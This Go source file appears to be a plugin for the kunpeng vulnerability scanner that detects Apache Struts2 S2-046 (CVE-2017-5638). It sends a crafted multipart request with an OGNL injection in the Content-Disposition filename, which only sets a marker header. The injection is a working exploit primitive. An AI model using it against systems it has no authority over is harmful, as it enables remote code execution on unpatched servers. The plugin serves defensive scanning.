package goplugin

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type struts2_46 struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("struts2", &struts2_46{})
}
func (d *struts2_46) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Struts2 s2-046 远程代码执行",
		Remarks: "It is possible to perform a RCE attack with a malicious Content-Disposition value or with improper Content-Length header.",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://cwiki.apache.org/confluence/display/WW/S2-046",
			CVE:  "CVE-2017-5638",
			KPID: "KP-0077",
		},
	}
	return d.info
}
func (d *struts2_46) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *struts2_46) Check(URL string, meta plugin.TaskMeta) bool {
	raw := `POST %s/ HTTP/1.1
Content-Length: 1000000000
Content-Type: multipart/form-data; boundary=1c88e9afa73c438d93b5043a7096b207
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Connection: close

--1c88e9afa73c438d93b5043a7096b207
Content-Disposition: form-data; name="image1"; filename="%%{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test-1234','Kaboom')}}'\x00b"
Content-Type: text/plain


foo
--1c88e9afa73c438d93b5043a7096b207--
`
	rawBytes := []byte(fmt.Sprintf(strings.Replace(raw, "\n", "\r\n", -1), URL))
	u, err := url.Parse(URL)
	if err != nil {
		return false
	}
	port := "80"
	if u.Port() == "" {
		if u.Scheme == "https" {
			port = "443"
		}
	} else {
		port = u.Port()
	}
	result, err := util.TCPSend(u.Hostname()+":"+port, rawBytes)
	if err != nil {
		return false
	}
	if strings.Contains(string(result), "X-Test-1234") {
		result := d.info
		result.Response = string(rawBytes)
		result.Request = string(rawBytes)
		d.result = append(d.result, result)
		return true
	}
	return false
}
